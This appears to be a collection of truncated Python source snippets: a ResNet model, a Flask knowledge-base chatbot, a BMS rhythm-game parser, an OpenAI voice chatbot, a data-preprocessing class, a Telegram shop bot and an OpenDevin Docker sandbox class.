self.conv4 = conv_block(256, 512, pool=True)\n#         self.res2 = nn.Sequential(conv_block(512, 512), conv_block(512, 512))  #512 x 32 x 32\n#         self.classifier = nn.Sequential(nn.MaxPool2d(4),                       #512 x 8 x 8\n#                                         nn.Flatten(),\n#                                         nn.Dropout(0.2),\n#                                         nn.Linear(512*8*8, num_classes))\n\n#     def forward(self, xb):\n#         out = self.conv1(xb)\n#         out = self.conv2(out)\n#         out = self.res1(out) + out\n#         out = self.conv3(out)\n#         out = self.conv4(out)\n#         out = self.res2(out) + out\n#         out = self.classifier(out)\n#         return out\n# def get_default_device():             #For GPU\n#     \"\"\"Pick GPU if available, else CPU\"\"\"\n#     if torch.cuda.is_available():\n#         return torch.device('cuda')\n#     else:\n#         return torch.device('cpu')\n\n# def to_device(data, device):\n#     \"\"\"Move tensor(s) to chosen device\"\"\"\n#     if isinstance(data, (list,tuple)):\n#         return [to_device(x, device) for x in data]\n#     return data.to(device, non_blocking=True)\n\n# class DeviceDataLoader():\n#     \"\"\"Wrap a dataloader to move data to a device\"\"\"\n#     def __init__(self, dl, device):\n#         self.dl = dl\n#         self.device = device\n\n#     def __iter__(self):\n#         \"\"\"Yield a batch of data after moving it to device\"\"\"\n#         for b in self.dl:\n#             yield to_device(b, self.device)\n\n#     def __len__(self):\n#         \"\"\"Number of batches\"\"\"\n#         return len(self.dl)\n# @torch.no_grad()\n# def evaluate(model, val_loader):\n#     model.eval()\n#     outputs = [model.validation_step(batch) for batch in val_loader]\n#     return model.validation_epoch_end(outputs)\n\n# def get_lr(optimizer):\n#     for param_group in optimizer.param_groups:\n#         return param_group['lr']\n\n# def fit_one_cycle(epochs, max_lr, model, train_loader, val_loader,\n#                    grad_clip=None, opt_func=torch.optim.SGD):\n#     torch.cuda.empty_cache()\n#     history = []\n\n#     # Se",
    "from flask import Flask, render_template, request\r\nimport json\r\nfrom difflib import SequenceMatcher\r\n\r\napp = Flask(__name__)\r\n\r\ndef load_knowledge_base(file_path):\r\n    # T\u1ea3i c\u01a1 s\u1edf tri th\u1ee9c t\u1eeb file json\r\n    try:\r\n        with open(file_path, 'r', encoding='utf-8') as file:\r\n            data = json.load(file)\r\n        return data\r\n    except Exception as e:\r\n        print(f\"Kh\u00f4ng th\u1ec3 t\u1ea3i d\u1eef li\u1ec7u: {str(e)}\")\r\n        return None\r\n\r\ndef find_closest_match(input_question, knowledge_base):\r\n    # T\u00ecm c\u00e2u h\u1ecfi g\u1ea7n nh\u1ea5t trong c\u01a1 s\u1edf tri th\u1ee9c so v\u1edbi c\u00e2u h\u1ecfi \u0111\u1ea7u v\u00e0o\r\n    max_ratio = 0\r\n    closest_question = None\r\n    for question in knowledge_base.keys():\r\n        ratio = SequenceMatcher(None, input_question, question).ratio()\r\n        if ratio > max_ratio:\r\n            max_ratio = ratio\r\n            closest_question = question\r\n    return closest_question if max_ratio > 0.6 else None\r\n\r\ndef get_response(question, knowledge_base):\r\n    # L\u1ea5y c\u00e2u tr\u1ea3 l\u1eddi cho c\u00e2u h\u1ecfi t\u1eeb c\u01a1 s\u1edf tri th\u1ee9c\r\n    closest_question = find_closest_match(question, knowledge_base)\r\n    if closest_question:\r\n        return knowledge_base[closest_question]\r\n    else:\r\n        return None\r\n\r\ndef update_knowledge_base(question, answer, knowledge_base):\r\n    # C\u1eadp nh\u1eadt c\u01a1 s\u1edf tri th\u1ee9c v\u1edbi c\u00e2u h\u1ecfi v\u00e0 c\u00e2u tr\u1ea3 l\u1eddi m\u1edbi\r\n    knowledge_base[question] = answer\r\n    with open('knowledge_base.json', 'w', encoding='utf-8') as file:\r\n        json.dump(knowledge_base, file, indent=2)\r\n\r\n@app.route('/')\r\ndef index():\r\n    return render_template('index.html')\r\n\r\n@app.route('/chat', methods=['POST'])\r\ndef chat():\r\n    user_input = request.form['user_input']\r\n    knowledge_base = load_knowledge_base('knowledge_base.json')\r\n    response = get_response(user_input, knowledge_base)\r\n    if response:\r\n        return response\r\n    else:\r\n        return \"T\u00f4i kh\u00f4ng hi\u1ec3u, B\u1ea1n c\u00f3 th\u1ec3 d\u1ea1y cho t\u00f4i kh\u00f4ng?\"\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\r\n\r\n",
    "\"\"\"\n * Copyright (C) 2024 VioletXF, khoeun03\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n\"\"\"\n\nimport hashlib\nimport random\nimport re\nfrom collections import OrderedDict\nimport os\nfrom typing import Union\nLaneAutoplay = 1\nSectionRate = 2\nBpmChange = 3\nBgaPlay = 4\nPoorPlay = 6\nLayerPlay = 7\nBpmChangeExtend = 8\nStop = 9\n\nP1KeyBase = 1 * 36 + 1\nP2KeyBase = 2 * 36 + 1\nP1InvisibleKeyBase = 3 * 36 + 1\nP2InvisibleKeyBase = 4 * 36 + 1\nP1LongKeyBase = 5 * 36 + 1\nP2LongKeyBase = 6 * 36 + 1\nP1MineKeyBase = 13 * 36 + 1\nP2MineKeyBase = 14 * 36 + 1\n\nScroll = 1020\n\nBeat7 = [0, 1, 2, 3, 4, 7, -1, 5, 6, 8, 9, 10, 11, 12, 15, -1, 13, 14]\n\nclass Note:\n    def __init__(self, wav: int):\n        self.lane = 0\n        self.wav = wav\n        self.timeline: Union[TimeLine, None] = None\n        self.is_played = False\n        self.is_dead = False\n        self.played_time = 0\n    def is_long_note(self):\n        return False\n    def is_landmine_note(self):\n        return False\n    def play(self, time: int):\n        self.is_played = True\n        self.played_time = time\n    def press(self, time: int):\n        self.play(time)\n    def reset(self):\n        self.is_played = False\n        self.is_dead = False\n        self.played_time = 0\nclass LandmineNote(Note):\n    def __init__(self, damage: float):\n        self.lane = -1\n        self.timeline = None\n        self.damage = damage\n    def is_long_note(self):\n        return False\n    def is_landmine_note(self):\n        return True\nclass LongNote(Note):\n    def __init__(self, wav: int):\n        super().__init__(wav)\n        self.tail: Union[LongNote, None] = None\n        self.head: Union[LongNote, None] = None\n        self.is_holding = False\n        self.release_time = 0\n    def is_long_note(self):\n        return True\n    def is_landmine_note(self):\n        return False\n    def is_tail(self):\n        return self.tail is None\n    def press(self, time: int):\n        self.play(time)\n        self.is_holding = True\n        if self.tail is not None:\n            self.tail.is_holding = True\n    def release(self, time: int):\n        self.play(time)\n        self.is_holding = False\n        if self.head is not None:\n            self.head.is_holding = False\n        self.release_time = time\n    def reset(self):\n        super().reset()\n        self.is_holding = False\n        self.release_time = 0\nclass TimeLine:\n    def __init__(self):\n        self.background_notes: list[Note] = []\n        self.invisible_notes: list[Union[Note, None]] = [None for _ in range(16)]\n        self.notes: list[Union[Note, None]] = [None for _ in range(16)]\n        self.landmine_notes: list[Union[LandmineNote, None]] = [None for _ in range(16)]\n        self.bpm = 0.0\n        self.bpm_change = False\n        self.bpm_change_applied = False\n        self.bga_base = -1\n        self.bga_layer = -1\n        self.bga_poor = -1\n        self.stop_length = 0.0\n        self.scroll = 1.0\n        self.timing = 0\n    def set_note(self, lane: int, note: Note):\n        self.notes[lane] = note\n        note.lane = lane\n        note.timeline = self\n        return self\n    def set_invisible_note(self, lane: int, note: Note):\n        self.invisible_notes[lane] = note\n        note.lane = lane\n        note.timeline = self\n        return self\n    def set_landmine_note(self, lane: int, note: LandmineNote):\n        self.landmine_notes[lane] = note\n        note.lane = lane\n        note.timeline = self\n        return self\n    def add_background_note(self, note: Note):\n        self.background_notes.append(note)\n        note.timeline = self\n        return self\n    def get_stop_duration(self):\n        return 1250000.0 * self.stop_length / self.bpm\nclass Measure:\n    def __init__(self):\n        self.scale = 1.0\n        self.timing = 0\n        self.timelines: list[TimeLine] = []\n\nclass ChartMeta:\n    def __init__(self):\n        self.sha256 = \"\"\n        self.md5 = \"\"\n        self.bms_path = \"\"\n        self.folder = \"\"\n        self.artist = \"\"\n        self.subartist = \"\"\n        self.bpm = 0.0\n        self.genre = \"\"\n        self.title = \"\"\n        self.subtitle = \"\"\n        self.rank = 1\n        self.total = 100.0\n        self.play_length = 0\n        self.total_length = 0\n        self.banner = \"\"\n        self.stage_file = \"\"\n        self.backbmp = \"\"\n        self.preview = \"\"\n        self.bga_poor_default = False\n        self.difficulty = 0\n        self.play_level = 3\n        self.",
    "\"\"\"\nAuthor: Marina Wooden\nDate: 04-12-2024\nDescription: The chatty cathy bot, which allows you to have a conversation with an ai\nperson.\n\"\"\"\n# speech recognition libs\nimport speech_recognition as sr\nimport io\nimport soundfile as sf\nimport sounddevice as sd\n\n# env vars read\nimport os\nfrom dotenv import load_dotenv\n\n# init chatgpt + whisper + related stufz\nfrom openai import OpenAI\nfrom pathlib import Path\n\n# regex\nimport re\n\n# open image\nimport requests\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom PIL import Image\nfrom io import BytesIO\n\nload_dotenv()\nOPENAI_API_KEY = os.getenv('OPENAI_API_KEY')\n\nopenai_client = OpenAI()\n\n# terminal colors\nclass bcolors:\n    CATHY = '\\u001b[44m'\n    USER = '\\u001b[43m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\nclass Cathy():\n    def __init__(self, role):\n      self.messages = [\n        {\n          \"role\": \"system\",\n          \"content\": f\"\"\"\n            You're Chatty Cathy - an AI friend bot.\n            The user will tell you who they want you to pretend to be,\n            and you'll mimic the speech patterns of that person.\n            Remember to keep it fun and casual!  Your friend wants\n            you to pretend to be {role}\n          \"\"\"\n        }\n      ]\n      self.role = role\n\n      # make photo of subject\n      response = openai_client.images.generate(\n        model=\"dall-e-3\",\n        prompt=f\"Headshot of {role}\",\n        size=\"1024x1024\",\n        quality=\"standard\",\n        n=1,\n      )\n\n      image_url = response.data[0].url\n\n      print(\"Hello! You're talking to Chatty Cathy!\")\n\n    def think(self):\n      # get response from bot\n      cathy_resp = openai_client.chat.completions.create(\n        model=\"gpt-3.5-turbo\",\n        messages=self.messages\n      )\n\n      cathy_resp = cathy_resp.choices[0].message.content\n      print(f\"{bcolors.CATHY}Cathy said:{bcolors.ENDC} {cathy_resp}\")\n      return cathy_resp\n    \n    def say(self, words):\n      self.messages.append({\"role\": \"assistant\", \"content\": words})\n      \n      # response to speech\n      spoken_response = openai_client.audio.speech.create(\n        model=\"tts-1\",\n        voice=\"onyx\",\n        input=words\n      )\n\n      # render speech without saving a file    \n      buffer = io.BytesIO()\n      for chunk in spoken_response.iter_bytes(chunk_size=4096):\n        buffer.write(chunk)\n\n      buffer.seek(0)\n\n      with sf.SoundFile(buffer, 'r') as sound_file:\n        data = sound_file.read(dtype='int16')\n        sd.play(data, sound_file.samplerate)\n        sd.wait()\n\n    def listen(self):\n      r = sr.Recognizer()\n      with sr.Microphone() as source:\n          audio = r.listen(source)\n\n      # recognize speech using Whisper API\n      try:\n        my_resp = r.recognize_whisper_api(audio, api_key=OPENAI_API_KEY)\n        print(f\"{bcolors.USER}You said:{bcolors.ENDC} {my_resp}\")\n\n        # log client message to conversation roster\n        self.messages.append({\"role\": \"user\", \"content\": my_resp})\n\n        # have cathy come up with a response and then play it out\n        cathy_resp = self.think()\n        self.say(cathy_resp)\n\n        # add response to conversation\n        self.messages.append({\"role\": \"assistant\", \"content\": cathy_resp})\n\n        return my_resp\n      except sr.RequestError as e:\n        print(f\"Could not request results from Whisper API; {e}\")\n        return \"Bye-bye.\"\n\ndef main():\n  sys_role = input(\"Who do you want to talk to? \")\n\n  bot = Cathy(sys_role)\n  cathy_resp = bot.think()\n  bot.say(cathy_resp)\n\n  speech = \"\"\n  while not re.match(r'Bye-?bye[!.]?', speech, re.IGNORECASE):\n    speech = bot.listen()\n\n\nif __name__ == '__main__':\n  main()",
    "import logging\nimport pandas as pd\nimport re\nfrom datetime import datetime\nfrom sklearn.model_selection import train_test_split\nfrom feature_engine.imputation import MeanMedianImputer, CategoricalImputer\nfrom feature_engine.encoding import OneHotEncoder\nfrom feature_engine.selection import DropConstantFeatures, DropCorrelatedFeatures\nfrom feature_engine.creation import CyclicalFeatures\nfrom feature_engine.outliers import Winsorizer\nfrom sklearn.preprocessing import StandardScaler, MinMaxScaler\nfrom sklearn.preprocessing import LabelEncoder\nfrom feature_engine.encoding import CountFrequencyEncoder\nimport os\n\n\n\nclass Data_Preprocess():\n    def __init__(self, df, name):\n        self.name = name\n        self.df = df\n        #self.df = self.df.sample(5000)\n        self.date_formats = (\n        '%b-%y','%Y-%m-%d', '%d-%m-%Y', '%m/%d/%Y', '%Y/%m/%d', '%B %d, %Y', '%d-%b-%Y','%b %d, %Y', '%Y-%m',         \n        '%m/%Y','%B %Y', '%Y-%m-%d %H:%M', '%d-%m-%Y %H:%M:%S','%m/%d/%Y %I:%M %p','%Y-%m-%dT%H:%M:%S''%a, %d %b %Y %H:%M:%S GMT', '%A, %B %d, %Y'   \n        )\n\n       \n        self.logger = self.setup_logger()\n        self.log_file = os.path.join(os.getcwd(), self.name, f\"{self.name}_logfile.log\")\n        # Ensure the directory exists\n        os.makedirs(os.path.join(os.getcwd(), self.name), exist_ok=True)\n\n        \n        # Configure logging\n        logging.basicConfig(filename=self.log_file, level=logging.INFO,\n                            format='%(asctime)s - %(levelname)s - %(message)s')\n\n        logging.info(\"Original shape: {}\".format(self.df.shape))\n        #logging.info(\"Data information: {}\".format(self.df.info()))\n\n    def setup_logger(self):\n        logger = logging.getLogger(__name__)\n        logger.setLevel(logging.INFO)\n\n        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\n\n        file_handler = logging.FileHandler(f'{self.name}_logfile.log', mode='w')\n        file_handler.setLevel(logging.INFO)\n        file_handler.setFormatter(formatter)\n\n        logger.addHandler(file_handler)\n\n        return logger\n\n    def drop_columns_with_high_nan(self, df, threshold=70):\n        try:\n            df_ = df.copy()\n            nan_percentages = df.isnull().mean() * 100\n            columns_to_drop = nan_percentages[nan_percentages > threshold].index\n            if columns_to_drop.any():\n                self.logger.info(\"Dropped columns with high null values: {}\".format(columns_to_drop))\n                return df.drop(columns=columns_to_drop)\n            else:\n                return df_\n        except Exception as e:\n            self.logger.info(f\"Error in drop_columns_with_high_nan : {e}\")\n        \n    def parse_dates(self,date_str):\n        for fmt in self.date_formats:\n            try:\n                return pd.to_datetime(date_str, format=fmt, exact=False)\n            except ValueError:\n                continue  # Continue trying other formats\n        return pd.NaT \n            \n    def clean_numeric_value(self,value):\n        # Remove commas and any non-numeric characters except dot, percent, and minus sign\n        value=str(value)\n        cleaned_value = re.sub(r'[^\\d.]', '', value)\n        return str(cleaned_value)\n\n\n    def change_datatype(self, df, column_name, new_datatype):\n        try:\n            if new_datatype == 'int':\n                df[column_name] =  df[column_name].apply(self.clean_numeric_value)\n                df[column_name] = pd.to_numeric(df[column_name], errors='coerce').astype(int)\n            elif new_datatype == 'float':\n                df[column_name] =  df[column_name].apply(self.clean_numeric_value)\n                df[column_name] = pd.to_numeric(df[column_name], errors='coerce').astype(float)\n            elif new_datatype == 'str':\n                df[column_name] = df[column_name].astype(str)\n            elif new_datatype == 'bool':\n                df[column_name] = df[column_name].astype(bool)\n            elif new_datatype == 'datetime':\n                df[column_name] =  df[column_name].apply(self.parse_dates)\n            else:\n                logging.warning(\"Unsupported data type.\")\n        except Exception as e:\n            self.logger.info(\"Error converting column '{}' to {}: {}\".format(column_name, new_datatype, e))\n\n    def is_time_series(self,df, time_column=None, threshold=0.9):\n        # Check if the dataset has a time column\n        if time_column is not None:\n            if time_column not in df.columns:\n                raise ValueError(f\"Time column '{time_column}' not found in the dataset.\")\n            else:\n                # Ensure time column is in datetime format\n                #df[time_column] = pd.to_datetime(df[time_column])\n                # Check if data is ordered chronologically\n                df1 = df.copy()\n                is_ordered = df1[time_column].is_monotonic_increasing\n                print(is_ordered)\n                # Check if data covers at least 90% of the time span (for stationarity)\n                time_span",
    "import telebot\nfrom telebot import types\nfrom telebot.types import ReplyKeyboardMarkup, KeyboardButton\n\nimport database\nimport buttons\n\nTOKEN = 'Your Bot token'\nbot = telebot.TeleBot(TOKEN, threaded=False)\n\nadminnn = #Your_user.id\n\n#hello\n@bot.message_handler(commands=['start'])\ndef start_message(message):\n\n    user = database.check_user(message.from_user.id)\n    if user:\n        bot.send_message(message.from_user.id, f'\u0417\u0434\u0440\u0430\u0441\u0442\u0432\u0443\u0439\u0442\u0435 {message.from_user.first_name}, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u0432 \u043c\u0435\u043d\u044e', reply_markup=buttons.main_menu())\n\n    else:\n        bot.send_message(message.from_user.id, f'\u0417\u0434\u0440\u0430\u0441\u0442\u0432\u0443\u0439\u0442\u0435 {message.from_user.first_name}, \u0447\u0442\u043e \u0431\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0431\u043e\u0442, \u043e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043a\u043d\u043e\u043f\u043a\u0438 \u043d\u0438\u0436\u0435', reply_markup=buttons.contact_button())\n        bot.register_next_step_handler(message, get_contact)\n\n\ndef get_contact(message):\n    telegram_id = message.from_user.id\n\n    if message.contact:\n        phone_number = message.contact.phone_number\n        first_name = message.contact.first_name\n\n        database.register_user(telegram_id, first_name, phone_number)\n\n\n###\n        bot.send_message(telegram_id, '\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043b\u0438\u0441\u044c, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u0432 \u043c\u0435\u043d\u044e', reply_markup=buttons.main_menu()) # menu button\n\n    else:\n        bot.send_message(message.from_user.id, '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \u043a\u043d\u043e\u043f\u043a\u0443 \"\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u043c\u0435\u0440\"', reply_markup=buttons.contact_button()) # phone_button\n        bot.register_next_step_handler(message, get_contact)\n\n\n@bot.message_handler(commands=['admin'])\ndef admin(message):\n    if message.from_user.id == 6833700546:\n        bot.send_message(message.from_user.id, '\u0412\u044b \u0432\u043e\u0448\u043b\u0438 \u0432 \u0430\u0434\u043c\u0438\u043d \u043f\u0430\u043d\u0435\u043b\u044c \u2b05\ufe0f', reply_markup=buttons.admin_menu())\n\n\ndef get_product_to_update(message):\n    if message.text == '\u041d\u0430\u0437\u0430\u0434 \u2b05\ufe0f':\n        bot.send_message(message.from_user.id, '\u0412\u044b \u0432\u0435\u0440\u043d\u0443\u043b\u0438\u0441\u044c \u0432 \u0430\u0434\u043c\u0438\u043d \u043f\u0430\u043d\u0435\u043b\u044c', reply_markup=buttons.admin_menu())\n\n    else:\n        product = message.text\n        bot.send_message(message.from_user.id, '\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0447\u0442\u043e \u0445\u043e\u0442\u0438\u0442\u0435 \u0438\u0437\u043c\u0438\u043d\u0438\u0442\u044c', reply_markup=buttons.admin_update_buttons())\n        bot.register_next_step_handler(message, get_admin_action, product)\n\n\ndef get_admin_action(message, product):\n    action = message.text\n    text = None\n\n    if action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0446\u0435\u043d\u0443':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0446\u0435\u043d\u0443 \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0444\u043e\u0442\u043e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0444\u043e\u0442\u043e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u0438\u0434\u0435\u043e':\n        text = '\u041e\u0442\u043f\u0440\u0430\u0432\u044c\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0432\u0438\u0434\u0435\u043e \u0442\u043e\u0432\u0430\u0440\u0430'\n\n    bot.send_message(message.from_user.id, text)\n    bot.register_next_step_handler(message, get_new_data, product, action)\n\n\ndef get_new_data(message, product, action):\n    new_data = None\n\n    if message.text:\n        new_data = message.text\n\n    elif message.photo[-1].file_id != None:\n        new_data = message.photo[-1].file_id\n\n    elif message.video.file_id != None:\n        new_data = message.video.file_id\n\n    else:\n        print('error')\n        # bot.send_message(message.from_user.id, 'Invalid name for product')\n        # bot.register_next_step_handler(message, get_admin_action, product, action)\n\n    if action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435':\n        database.update_product_name(product, new_data)\n        bot.send_message(message.from_user.id, '\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435':\n        database.update_product_desc(product, new_data)\n        bot.send_message(message.from_user.id, '\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0446\u0435\u043d\u0443':\n        database.update_product_price(product, new_data)\n        bot.send_message(message.from_user.id, '\u0426\u0435\u043d\u0430 \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e':\n        database.update_product_category(product, new_data)\n        bot.send_message(message.from_user.id, '\u041a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0444\u043e\u0442\u043e':\n        database.update_product_photo(product, new_data)\n        bot.send_message(message.from_user.id, '\u0424\u043e\u0442\u043e\u0433\u0440\u0430\u0444\u0438\u044f \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n    elif action == '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u0432\u0438\u0434\u0435\u043e':\n        database.update_product_video(product, new_data)\n        bot.send_message(message.from_user.id, '\u0412\u0438\u0434\u0435\u043e \u0442\u043e\u0432\u0430\u0440\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u043e')\n\n\ndef get_product_name(message, action):\n    name = message.text\n\n    if action == '\u0443\u0434\u0430\u043b\u0438\u0442\u044c':\n\n        database.delete_product(name)\n        bot.send_message(message.from_user.id, '\u041f\u0440\u043e\u0434\u0443\u043a\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0434\u0430\u043b\u0435\u043do', reply_markup=buttons.admin_menu())\n\n    elif action == '\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c':\n        bot.send_message(message.from_user.id, '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430')\n        bot.register_next_step_handler(message, get_product_desc, name)\n\n\ndef get_product_desc(message, name):\n    desc = message.text\n\n    bot.send_message(message.from_user.id, '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0446\u0435\u043d\u0443 \u0442\u043e\u0432\u0430\u0440\u0430 \u0432 \u0441\u0443\u043c\u043c\u0430\u0445!')\n    bot.register_next_step_handler(message, get_product_pr",
    "import atexit\nimport os\nimport platform\nimport sys\nimport time\nimport uuid\nfrom collections import namedtuple\nfrom typing import Dict, List, Tuple, Union\n\nimport docker\nfrom pexpect import pxssh\n\nfrom opendevin import config\nfrom opendevin.logger import opendevin_logger as logger\nfrom opendevin.sandbox.sandbox import Sandbox, BackgroundCommand\nfrom opendevin.schema import ConfigType\nfrom opendevin.utils import find_available_tcp_port\n\nInputType = namedtuple('InputType', ['content'])\nOutputType = namedtuple('OutputType', ['content'])\n\n# helpful for docker-in-docker scenarios\nDIRECTORY_REWRITE = config.get(ConfigType.DIRECTORY_REWRITE)\nCONTAINER_IMAGE = config.get(ConfigType.SANDBOX_CONTAINER_IMAGE)\n\n# FIXME: On some containers, the devin user doesn't have enough permission, e.g. to install packages\n# How do we make this more flexible?\nRUN_AS_DEVIN = config.get('RUN_AS_DEVIN').lower() != 'false'\nUSER_ID = 1000\nif SANDBOX_USER_ID := config.get('SANDBOX_USER_ID'):\n    USER_ID = int(SANDBOX_USER_ID)\nelif hasattr(os, 'getuid'):\n    USER_ID = os.getuid()\n\n\nclass DockerSSHBox(Sandbox):\n    instance_id: str\n    container_image: str\n    container_name_prefix = 'opendevin-sandbox-'\n    container_name: str\n    container: docker.models.containers.Container\n    docker_client: docker.DockerClient\n\n    _ssh_password: str\n    _ssh_port: int\n\n    cur_background_id = 0\n    background_commands: Dict[int, BackgroundCommand] = {}\n\n    def __init__(\n            self,\n            workspace_dir: str | None = None,\n            container_image: str | None = None,\n            timeout: int = 120,\n            sid: str | None = None,\n    ):\n        # Initialize docker client. Throws an exception if Docker is not reachable.\n        try:\n            self.docker_client = docker.from_env()\n        except Exception as ex:\n            logger.exception(\n                'Please check Docker is running using `docker ps`.', exc_info=False)\n            raise ex\n\n        self.instance_id = sid if sid is not None else str(uuid.uuid4())\n        if workspace_dir is not None:\n            os.makedirs(workspace_dir, exist_ok=True)\n            # expand to absolute path\n            self.workspace_dir = os.path.abspath(workspace_dir)\n        else:\n            self.workspace_dir = os.getcwd()\n            logger.info(\n                'workspace unspecified, using current directory: %s', workspace_dir)\n        if DIRECTORY_REWRITE != '':\n            parts = DIRECTORY_REWRITE.split(':')\n            self.workspace_dir = self.workspace_dir.replace(parts[0], parts[1])\n            logger.info('Rewriting workspace directory to: %s',\n                        self.workspace_dir)\n        else:\n            logger.info('Using workspace directory: %s', self.workspace_dir)\n\n        # TODO: this timeout is actually essential - need a better way to set it\n        # if it is too short, the container may still waiting for previous\n        # command to finish (e.g. apt-get update)\n        # if it is too long, the user may have to wait for a unnecessary long time\n        self.timeout = timeout\n        self.container_image = CONTAINER_IMAGE if container_image is None else container_image\n        self.container_name = self.container_name_prefix + self.instance_id\n\n        # set up random user password\n        self._ssh_password = str(uuid.uuid4())\n        self._ssh_port = find_available_tcp_port()\n\n        # always restart the container, cuz the initial be regarded as a new session\n        self.restart_docker_container()\n\n        self.setup_user()\n        self.start_ssh_session()\n        atexit.register(self.close)\n\n    def setup_user(self):\n\n        # Make users sudoers passwordless\n        # TODO(sandbox): add this line in the Dockerfile for next minor version of docker image\n        exit_code, logs = self.container.exec_run(\n            ['/bin/bash', '-c',\n             r\"echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\"],\n            workdir='/workspace',\n        )\n        if exit_code != 0:\n            raise Exception(\n                f'Failed to make all users passwordless sudoers in sandbox: {logs}')\n\n        # Check if the opendevin user exists\n        exit_code, logs = 